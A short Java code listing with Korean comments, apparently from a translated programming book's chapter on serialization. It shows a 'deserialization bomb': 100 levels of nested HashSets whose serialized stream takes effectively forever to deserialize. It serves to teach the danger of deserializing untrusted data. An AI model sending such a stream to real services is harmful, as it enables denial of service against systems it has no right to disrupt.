// 코드 85-1 역질렬화 폭탄 - 이 스트림의 역직렬화는 영원히 계속된다.

static byte[] bomb() {
    Set<Object> root = new HashSet<>();
    Set<Object> s1 = root;
    Set<Object> s2 = new HashSet<>();
    for (int i = 0; i < 100; i++) {
	Set<Object> t1 = new HashSet<>();
	Set<Object> t2 = new HashSet<>();
	t1.add("foo"); // t1을 t2와 다르게 만든다.
	s1.add(t1); s1.add(t2);
	s2.add(t1); s2.add(t2);
	s1 = t1;
	s2 = t2;
    }
    return serialize(root); // 간결하게 하기 위해 이 메서드의 코드는 생략함
}
